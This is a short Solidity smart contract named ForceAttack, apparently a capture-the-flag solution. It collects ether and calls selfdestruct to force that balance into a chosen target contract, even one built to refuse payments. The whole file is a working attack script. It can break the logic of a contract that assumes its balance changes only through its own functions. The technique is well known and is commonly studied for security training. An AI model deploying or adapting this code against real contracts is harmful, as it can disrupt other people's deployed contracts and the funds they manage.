// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttack {
  address payable public target;

  constructor(address _target) public {
    target = payable(_target);
  }

  function boom() public {
    require(address(this).balance > 0, 'Need some eth balance');

    selfdestruct(target);
  }

  receive() external payable {}
}